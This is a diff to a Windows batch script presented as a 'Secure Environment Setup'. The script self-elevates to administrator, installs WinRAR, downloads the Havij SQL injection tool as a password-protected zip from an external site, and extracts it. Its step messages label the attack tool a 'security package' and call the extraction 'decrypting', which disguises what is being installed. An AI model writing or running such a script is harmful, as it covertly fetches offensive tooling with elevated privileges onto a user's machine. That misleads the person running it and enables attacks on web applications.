@@ -9,6 +9,7 @@ set "winrar_url=https://www.win-rar.com/fileadmin/winrar-versions/winrar/winrar-
 set "winrar_installer=!folder!\WinRAR-free.exe"
 set "havij_url=https://www.darknet.org.uk/content/files/Havij_1.12_Free.zip"
 set "havij_zip=!folder!\Havij_1.12_Free.zip"
+set "winrar_exe=C:\Program Files\WinRAR\WinRAR.exe"
 set "password=darknet123"
 
 :: Header
@@ -17,11 +18,11 @@ echo Secure Environment Setup - Arena Web Security
 echo =============================================
 echo.
 
-:: Check admin rights (ONLY CHANGE MADE)
+:: Check admin rights
 net session >nul 2>&1
 if %errorLevel% neq 0 (
     echo [STEP] Requesting administrative privileges...
-    powershell -Command "Start-Process cmd -ArgumentList '/c \"\"%~dpnx0\"\"' -Verb RunAs"
+    powershell -Command "Start-Process cmd -ArgumentList '/c %~dpnx0' -Verb RunAs"
     exit /b
 )
 
@@ -58,11 +59,6 @@ echo [STEP] Installing/Updating WinRAR...
 timeout /t 5 /nobreak >nul
 del "!winrar_installer!" >nul
 
-:: Get WinRAR path from registry
-set "winrar_exe="
-for /f "tokens=2*" %%A in ('reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\WinRAR.exe" /ve 2^>nul ^| find "REG_SZ"') do set "winrar_exe=%%B"
-if not defined winrar_exe set "winrar_exe=C:\Program Files\WinRAR\WinRAR.exe"
-
 :: Download Havij ZIP
 echo [STEP] Retrieving security package...
 powershell -Command "Invoke-WebRequest -Uri '%havij_url%' -OutFile '!havij_zip!'" && (
@@ -73,7 +69,7 @@ powershell -Command "Invoke-WebRequest -Uri '%havij_url%' -OutFile '!havij_zip!'
     exit /b
 )
 
-:: Modified extraction section
+:: Modified extraction section with waiting
 echo [STEP] Decrypting secure package...
 start "" /wait "!winrar_exe!" x -ibck -p"%password%" "!havij_zip!" "!folder!\"
 
